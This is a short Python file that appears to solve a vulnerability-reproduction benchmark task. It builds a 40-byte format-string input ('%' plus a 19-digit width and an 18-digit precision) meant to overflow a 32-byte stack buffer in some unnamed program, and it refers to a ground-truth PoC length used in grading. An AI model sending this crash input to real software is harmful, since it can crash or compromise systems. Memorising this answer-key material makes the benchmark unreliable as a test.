import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability description indicates a Stack Buffer Overflow caused by
        # an integer format string exceeding 32 characters.
        # The buffer size is limited to 32 characters.
        # We need to generate a format string that, when reconstructed by the vulnerable code,
        # exceeds this limit.
        # The description mentions maximum width and precision up to 19 digits.
        # Ground truth PoC length is 40 bytes.
        
        # We construct a payload of exactly 40 bytes to match the ground truth length
        # and ensure the buffer overflow is triggered reliably.
        # Format: %<width>.<precision>d
        # Components:
        # '%' : 1 byte
        # Width: 19 digits (e.g. "1" * 19). This is the max digits for a 64-bit integer.
        # '.' : 1 byte
        # Precision: 18 digits (e.g. "1" * 18).
        # 'd' : 1 byte
        # Total length: 1 + 19 + 1 + 18 + 1 = 40 bytes.
        
        width = "1" * 19
        precision = "1" * 18
        poc = f"%{width}.{precision}d"
        
        return poc.encode()